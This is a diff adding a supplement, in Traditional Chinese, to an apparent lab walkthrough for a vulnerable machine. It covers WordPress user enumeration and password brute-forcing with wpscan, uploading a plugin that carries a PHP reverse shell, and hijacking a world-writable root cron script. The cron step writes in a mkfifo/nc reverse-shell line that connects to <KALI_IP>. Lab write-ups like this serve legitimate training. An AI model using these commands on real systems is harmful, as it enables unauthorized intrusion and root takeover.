@@ -445,3 +445,62 @@ PORT      STATE SERVICE     REASON         VERSION
 	```
 
 # 補充
+
+## 1. 替代初始存取路徑：WordPress 帳密爆破與外掛上傳 (Alternative Initial Access)
+
+除了 LFI 漏洞以外，也可以透過 WordPress 的常規弱點進行利用：
+
+1. **使用者列舉與密碼爆破**：
+   使用 `wpscan` 列舉系統中的使用者，並使用 `rockyou.txt` 進行密碼暴力破解：
+   ```bash
+   # 列舉使用者
+   wpscan --url https://192.168.133.148:12380/blogblog/ --disable-tls-checks --enumerate u
+
+   # 使用 rockyou 密碼檔進行字典檔爆破
+   wpscan --url https://192.168.133.148:12380/blogblog/ --disable-tls-checks --usernames john,peter,barry,heather,garry,elly,harry,scott,kathy,tim --passwords /usr/share/wordlists/rockyou.txt
+   ```
+   *   爆破結果能成功取得管理員（John Smith，帳號 `john`）的登入憑證。
+
+2. **登入 WordPress 後台上傳惡意外掛**：
+   *   存取 `https://192.168.133.148:12380/blogblog/wp-login.php` 並登入管理員帳號。
+   *   進入 `Plugins` > `Add New` > `Upload Plugin`。
+   *   上傳一個包含 PHP Reverse Shell 的 ZIP 壓縮檔（當後台提示需要 FTP 伺服器憑證時，可使用匿名帳號 `anonymous` / 空密碼，或直接留空跳過）。
+
+3. **觸發 Web Shell**：
+   *   上傳成功後，外掛檔案會被儲存至 WordPress 的上傳目錄下：
+       `https://192.168.133.148:12380/blogblog/wp-content/uploads/`
+   *   在本地端執行監聽（例如 `nc -lvnp 4444`），並透過瀏覽器或 `curl` 存取該上傳的 PHP Shell 檔案以觸發 Reverse Shell，取得 `www-data` 權限。
+
+---
+
+## 2. 替代提權路徑：定時任務指令碼可寫漏洞 (Cron Job Privilege Escalation)
+
+除了透過 peter 使用者的 `.bash_history` 獲取密碼並利用 `sudo` 提權外，此靶機還存在一個定時任務的配置不當漏洞：
+
+1. **尋找本機定時任務 (Cron Jobs)**：
+   檢查 `/etc/` 目錄下的定時任務設定：
+   ```bash
+   find /etc/*cron* -type f -ls 2>/dev/null -exec cat {} \; > /tmp/cron.txt
+   grep '*' /tmp/cron.txt
+   ```
+   發現 root 使用者每 5 分鐘會自動執行一次清理指令碼：
+   `/usr/local/sbin/cron-logrotate.sh`
+
+2. **檢查檔案權限**：
+   ```bash
+   ls -l /usr/local/sbin/cron-logrotate.sh
+   ```
+   發現該指令碼對 `other` 使用者具有**寫入 (write)** 權限，即任何人（包括 `www-data`）都可以修改它。
+
+3. **注入惡意 Reverse Shell 指令**：
+   往該指令碼中寫入逆向連線指令（此處以 nc 做示範）：
+   ```bash
+   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f" > /usr/local/sbin/cron-logrotate.sh
+   ```
+
+4. **取得 Root 權限**：
+   在 Kali 上執行監聽並等待最多 5 分鐘，定時任務執行時即會以 root 權限回傳一個 Shell：
+   ```bash
+   nc -lvnp 4444
+   # 成功連線後執行 whoami 即為 root
+   ```
